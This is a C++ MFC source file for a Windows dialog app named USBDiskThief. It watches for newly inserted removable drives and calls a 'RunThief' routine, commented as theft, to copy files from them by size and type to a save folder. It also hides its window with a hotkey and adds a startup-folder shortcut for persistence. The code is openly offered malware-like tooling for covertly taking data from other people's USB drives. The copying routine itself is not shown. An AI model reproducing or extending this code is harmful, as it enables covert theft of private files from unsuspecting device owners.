
// USBDiskThiefDlg.cpp : implementation file
//

#include "pch.h"
#include "framework.h"
#include "USBDiskThief.h"
#include "USBDiskThiefDlg.h"
#include "afxdialogex.h"
#include "FileTools.h"
#include "ChoosePath.h"
#include <windowsx.h>
#include "PathTools.h"
#include "Watch.h"
#include "Log.h"




#ifndef USBDiskThiefDlg
#define HOT_KEY_ALT_G 0X1
#endif

#ifdef _DEBUG
#define new DEBUG_NEW
#endif


DWORD PrevDriveList = 0;	//标识上次的驱动列表,用于判断新增驱动器
struct USBDiskThief 
{
};


// CAboutDlg dialog used for App About

class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

// Dialog Data
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_ABOUTBOX };
#endif

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support

// Implementation
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialogEx(IDD_ABOUTBOX)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
END_MESSAGE_MAP()


// CUSBDiskThiefDlg dialog



CUSBDiskThiefDlg::CUSBDiskThiefDlg(CWnd* pParent /*=nullptr*/)
	: CDialogEx(IDD_USBDISKTHIEF_DIALOG, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CUSBDiskThiefDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CUSBDiskThiefDlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDC_BUTTON_CHOOSE_PATH, &CUSBDiskThiefDlg::OnBnClickedButtonChoosePath)
	ON_BN_CLICKED(IDC_BUTTON2, &CUSBDiskThiefDlg::OnBnClickedButton2)
	ON_WM_HOTKEY()
	ON_BN_CLICKED(IDC_BUTTON_CONFIGURE, &CUSBDiskThiefDlg::OnBnClickedButtonConfigure)
	ON_BN_CLICKED(IDC_BUTTON_START_WATCH, &CUSBDiskThiefDlg::OnBnClickedButtonStartWatch)
	ON_BN_CLICKED(IDC_BUTTON_END_WATCH, &CUSBDiskThiefDlg::OnBnClickedButtonEndWatch)
	ON_WM_DEVICECHANGE()
	ON_BN_CLICKED(IDCANCEL, &CUSBDiskThiefDlg::OnBnClickedCancel)
	ON_BN_CLICKED(IDC_BUTTON_SHOW_LOG, &CUSBDiskThiefDlg::OnBnClickedButtonShowLog)
END_MESSAGE_MAP()


// CUSBDiskThiefDlg message handlers

BOOL CUSBDiskThiefDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// Add "About..." menu item to system menu.

	// IDM_ABOUTBOX must be in the system command range.
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != nullptr)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon

	//ShowWindow(SW_MINIMIZE);
	ShowWindow(SW_SHOW);


	// TODO: Add extra initialization here

	//设置默认保存路径
	TCHAR ptaDrive[MAX_PATH] = { 0 };
	if (GetMAXFreeSpaceDiskDrive(ptaDrive, MAX_PATH))
	{
		wcscat_s(ptaDrive, MAX_PATH,L"USBDriveThiefTest");
		SetDlgItemText(IDC_STATIC_SAVE_PATH, ptaDrive);

	}

	//注册热键
	RegisterHotKey(m_hWnd, HOT_KEY_ALT_G, MOD_ALT, 0x4D);

	//获取最初驱动
	PrevDriveList = GetLogicalDrives();

	//初始化日志
	InitLogFile();

	//默认属性
	CWnd* cWnd = GetDlgItem(IDC_CHECK2);
	Button_SetCheck(cWnd->m_hWnd, BST_CHECKED);


	return TRUE;  // return TRUE  unless you set the focus to a control
}

void CUSBDiskThiefDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.

void CUSBDiskThiefDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

// The system calls this function to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CUSBDiskThiefDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}





void CUSBDiskThiefDlg::OnBnClickedButtonChoosePath()
{
	// TODO: Add your control notification handler code here
	//MessageBox(L"IDC_BUTTON_CHOOSE_PATH");	//Test


	TCHAR SelectPath[MAX_PATH + 2] = { 0 };
	//初始化COM库以供调用线程使用，设置线程的并发模型，并在需要时为线程创建一个新的单元
	//不初始化无法调用BasicPathChoose()
	HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
	if (SUCCEEDED(hr))
	{
		if (BasicPathChoose(SelectPath, MAX_PATH + 2))
			SetDlgItemText(IDC_STATIC_SAVE_PATH, SelectPath);
		//else
			//MessageBox(L"Select Save Path Failed");
		CoUninitialize();
	}

	
}


void CUSBDiskThiefDlg::OnBnClickedButton2()
{
	// TODO: Add your control notification handler code here
	//IDC_EDIT1
	/**
	 * 1 获取编辑框IDC_EDIT_FILE_SIZE中内容
	 * 2 判断内容是否为数字 -> 否.提示并退出
	 * 3 更改静态文本框IDC_STATIC_FILE_SIZE内容
	 */
	TCHAR FileSizeTemplate[] = L"File < %s MB";
	TCHAR FileSize[9] = { 0 };
	TCHAR FileSizeShow[30] = {0};
	if (!::GetDlgItemText(m_hWnd, IDC_EDIT_FILE_SIZE, FileSize, 9))
	{
		MessageBox(L"IDC_EDIT_FILE_SIZE文本获取失败");
		return;
	}

	swprintf_s(FileSizeShow,30, FileSizeTemplate, FileSize);
	SetDlgItemText(IDC_STATIC_FILE_SIZE, FileSizeShow);



}




void CUSBDiskThiefDlg::OnHotKey(UINT nHotKeyId, UINT nKey1, UINT nKey2)
{
	// TODO: Add your message handler code here and/or call default

	//MessageBox(L"热键");

	if (nHotKeyId == HOT_KEY_ALT_G) {
	
		if (IsWindowVisible()) 
		{
			if (!ShowWindow(SW_HIDE))
			{
				MessageBox(L"隐藏失败");
			}
		}
		else
		{
			if (ShowWindow(SW_SHOW)) 
			{
				MessageBox(L"显示失败");
			}
		}

	}


	CDialogEx::OnHotKey(nHotKeyId, nKey1, nKey2);
}


void CUSBDiskThiefDlg::OnBnClickedButtonConfigure()
{
	// TODO: Add your control notification handler code here
	/**
	 * 1 获取IDC_CHECK_AUTOMATIC_START状态
	 * 2 根据状态选择删除或新增快捷方式
	 */
	HANDLE ExistFile = NULL;

	CustomShortCut customShortCut = { 0 };

	TCHAR OriginalFileName[MAX_PATH] = { 0 };
	TCHAR LinkFileName[MAX_PATH] = { 0 };
	CWnd* cWnd = GetDlgItem(IDC_CHECK_AUTOMATIC_START);
	if(Button_GetCheck(cWnd->m_hWnd)== BST_CHECKED)
	{
		//选中

		//获取源目标 获取系统自启路径 拼接字符
		if (!GetModuleFileName(NULL, OriginalFileName, MAX_PATH)|| !GetSystemAutoStartPath(LinkFileName, MAX_PATH)
			|| wcscat_s(LinkFileName, MAX_PATH, L"\\UsbDiskThief.lnk"))
		{
			MessageBox(L"Configure Failed");
			return;
		}
	
		customShortCut.lpszPathLink = LinkFileName;
		customShortCut.lpszPathObj = OriginalFileName;
		customShortCut.lpszDesc = L"?";


		//判断是否存在, 存在->创建成功
		if (PathFileExists(LinkFileName))
		{
			MessageBox(L"Configure Success");
			return;
		}

		//创建快捷方式
		if (CustomCreateLink(&customShortCut))
		{
			MessageBox(L"Configure Success");
		}
		else
		{
			MessageBox(L"Configure Failed");
		}
		
	}
	else
	{
	
		//获取源目标 获取系统自启路径 删除文件
		if ( !GetSystemAutoStartPath(LinkFileName, MAX_PATH)
			|| wcscat_s(LinkFileName, MAX_PATH, L"\\UsbDiskThief.lnk")
			|| !DeleteFile(LinkFileName))
		{
			//判断是否存在,不存在->删除成功
			if (!PathFileExists(LinkFileName))
			{
				MessageBox(L"Configure Success");
				return;
			}

			MessageBox(L"Configure Failed");
			return;
		}
			

		MessageBox(L"Configure Success");
		
	}

}


TCHAR SavePath[MAX_PATH] = { 0 };
DWORD FileSize = 0;
DWORD FileType = 0;

BOOL WarchFlag = FALSE;

void CUSBDiskThiefDlg::OnBnClickedButtonStartWatch()
{
	TCHAR FileSizeText[50] = { 0 };
	TCHAR* pFileSizeText = FileSizeText;

	// TODO: Add your control notification handler code here
	if (StartWatch(m_hWnd)) {

		::GetDlgItemText(m_hWnd, IDC_STATIC_SAVE_PATH, SavePath,MAX_PATH);	//保存路径
		::GetDlgItemText(m_hWnd, IDC_STATIC_FILE_SIZE, FileSizeText, 50);	//文件大小
		while (*pFileSizeText) {
			if (iswdigit(*pFileSizeText))
				FileSize = FileSize * 10 + *pFileSizeText - 48;
			pFileSizeText++;
		}
			

		//文件类型
		CWnd* cWnd = GetDlgItem(IDC_CHECK1);
		if (Button_GetCheck(cWnd->m_hWnd) == BST_CHECKED)
			FileType |= ALL_TYPE;
		cWnd = GetDlgItem(IDC_CHECK2);
		if (Button_GetCheck(cWnd->m_hWnd) == BST_CHECKED)
			FileType |= TXT_TYPE;
		cWnd = GetDlgItem(IDC_CHECK3);
		if (Button_GetCheck(cWnd->m_hWnd) == BST_CHECKED)
			FileType |= DOC_TYPE;


		WarchFlag = TRUE;
		MessageBox(L"Warhc run success");
	}
	

}


void CUSBDiskThiefDlg::OnBnClickedButtonEndWatch()
{
	// TODO: Add your control notification handler code here
	if (EndWatch())	
	{
		ZeroMemory(SavePath, MAX_PATH);
		FileSize = 0;
		FileType = 0;
		WarchFlag = FALSE;
		MessageBox(L"Warhc stop success");
	}


}




BOOL CUSBDiskThiefDlg::OnDeviceChange(UINT nEventType, DWORD_PTR dwData)
{

	DWORD CurrenDriveList = 0;
	DWORD NewDrive = 0;
	DWORD DriveNumber = 0;
	TCHAR drive[4] = L"C:\\";
	//CDialogEx::OnDeviceChange(nEventType, dwData);

	if (!WarchFlag) return FALSE;

	// TODO: Add your message handler code here
	switch (nEventType)
	{
	case DBT_DEVICEARRIVAL:

		if (CurrenDriveList = GetLogicalDrives())	//有值处理
		{
			if (NewDrive = CurrenDriveList ^ PrevDriveList)//得到新增驱动
			{

				do 
				{
					//将所有新增的设备都检测
					if (NewDrive & 0x1)	//当前位不为0
					{
						*drive = 'A' + DriveNumber; //新增驱动器

						//判断是否为U盘
						if (GetDriveType(drive) == DRIVE_REMOVABLE)
						{

							//偷窃
							RunThief(SavePath, FileSize, FileType, drive);
						}
							


						

					}

					NewDrive >>= 1;
					DriveNumber++;

				} while (NewDrive);
				
				PrevDriveList = CurrenDriveList;

				return TRUE;

			}


		}

	case DBT_DEVICEREMOVECOMPLETE:

		PrevDriveList = GetLogicalDrives();	//更新当前驱动器列表
		
		return TRUE;

	}
	return FALSE;

}


void CUSBDiskThiefDlg::OnBnClickedCancel()
{
	// TODO: Add your control notification handler code here
	EndWatch();
	CDialogEx::OnCancel();
}


void CUSBDiskThiefDlg::OnBnClickedButtonShowLog()
{


	// TODO: Add your control notification handler code here
}
